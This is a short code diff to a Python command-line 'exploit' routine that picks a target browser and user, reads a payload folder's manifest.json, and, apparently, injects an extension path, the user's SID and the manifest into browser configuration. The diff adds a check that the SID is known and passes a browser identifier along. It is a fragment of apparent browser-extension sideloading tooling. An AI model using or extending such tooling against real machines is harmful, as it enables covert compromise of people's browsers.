@@ -373,6 +373,10 @@ def exploit(
         
         target_info = available_targets[user_index - 1]
         log.info(f"Targeting {target_info['browser_name']} for user {target_info['user']}")
+
+        if target_info.get('sid') in (None, "", "Unknown"):
+            log.error("Target SID is unknown. Run 'check' again and make sure SID resolution succeeds before exploit.")
+            raise typer.Exit(code=1)
         
         # Step 1: Check the folder locally and read manifest.json
         if not os.path.isdir(payload):
@@ -452,7 +456,8 @@ def exploit(
                     content,
                     absolute_extension_path,
                     target_info['sid'],
-                    manifest_content
+                    manifest_content,
+                    target_info['browser_id']
                 )
             
             if not updated_content:
